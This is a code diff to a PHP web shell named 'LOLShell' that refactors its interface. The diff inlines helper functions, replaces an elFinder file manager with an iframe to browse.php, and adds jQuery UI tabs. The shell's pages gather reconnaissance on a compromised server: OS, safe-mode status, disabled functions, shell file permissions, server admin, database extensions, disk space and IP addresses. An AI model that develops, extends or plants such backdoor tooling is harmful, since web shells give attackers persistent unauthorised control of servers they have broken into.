@@ -35,7 +35,7 @@
   $sm = @ini_get('safe_mode');
   // Default Directory separator
   $SEPARATOR = "/";
-  $os = "N/D";
+  $os = "Unknown";
 
   if (stristr(php_uname(), "Windows")) {
       $SEPARATOR = "\\";
@@ -64,10 +64,6 @@
   {
       return getenv('SERVER_ADDR');
   }
-  function getSoftwareInfo()
-  {
-      return php_uname();
-  }
   function diskSpace()
   {
       return HumanReadableFilesize(disk_total_space("/"));
@@ -76,19 +72,10 @@
   {
       return HumanReadableFilesize(disk_free_space("/"));
   }
-  function getSafeMode()
-  {
-      global $sm;
-      return $sm ? true : false;
-  }
-  function getAppver()
-  {
-      global $appVersion;
-      return $appVersion;
-  }
+
   function getShellPerms()
   {
-      return getFilePermissions('.');
+      return getFilePermissions(__FILE__);
   }
 
   function getDisabledFunctions()
@@ -218,18 +205,19 @@
   <meta name="author" content="Contra">
 
   <link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/themes/dark-hive/jquery-ui.css">
-  <link rel="stylesheet" href="elfinder/css/elfinder.css" type="text/css">
 
   <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.0.6/modernizr.min.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/jquery-ui.min.js"></script>
-  <script type="text/javascript" src="http://jqueryui.com/themeroller/themeswitchertool/"></script>
-  <script src="elfinder/js/elfinder.min.js" type="text/javascript" charset="utf-8"></script>
-  <script src="init.js"></script>
-
+  <script type="text/javascript">
+	$(document).ready(function() {
+		$("#info-accordion").accordion({ collapsible: true });
+		$("#mysql-accordion").accordion({ collapsible: true });
+		$("#navtabs").tabs();
+	});
+  </script>
 </head>
 <body bgcolor="black">
-<div id="switcher"></div><br/>
 <div id="navtabs">
   <ul>
     <li><a href="#sysinfo"><span>System Information</span></a></li>
@@ -240,7 +228,7 @@
     <div id="info-accordion">
       <h3><a href="#">General</a></h3>
       <div>
-      LOLShell Version: <?php echo getAppver();?><br/>
+      LOLShell Version: <?php echo $appVersion;?><br/>
       Working Directory: <?php echo getcwd();?><br/>
       Shell Permissions: <?php echo getShellPerms();?><br/>
       Your IP: <?php echo getClientIp();?>
@@ -249,7 +237,7 @@
       <h3><a href="#">PHP</a></h3>
       <div>
       Version: <?php echo $phpVersion;?><br/>
-      Safe Mode: <?php echo getSafeMode() ? ("<font color='red'>Enabled</font>") : ("<font color='green'>Disabled</font>");?><br/>
+      Safe Mode: <?php echo $sm ? ("<font color='red'>Enabled</font>") : ("<font color='green'>Disabled</font>");?><br/>
       Curl: <?php echo function_exists('curl_version') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?></li><br/>
       Oracle: <?php echo function_exists('ocilogon') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?><br/>
       MySQL: <?php echo function_exists('mysql_connect') ? ("<font color='green'>Enabled</font>") : ("<font color='red'>Disabled</font>");?><br/>
@@ -262,7 +250,7 @@
       <div>
       Server IP: <?php echo getServerIp();?><br/>
       Server Admin: <?php echo $_SERVER['SERVER_ADMIN'];?><br/>
-      Operating System: <?php echo getSoftwareInfo();?><br/>
+      Operating System: <?php echo php_uname();?><br/>
       </div>
 
       <h3><a href="#">Disk</a></h3>
@@ -273,7 +261,7 @@
     </div>
   </div>
   <div id="filebrowser">
-    <div id="finder">finder</div>
+    <center><iframe src="browse.php" height="60%" width="90%" frameBorder="0"></iframe></center>
   </div>
   <div id="mysql">
     <div id="mysql-accordion">
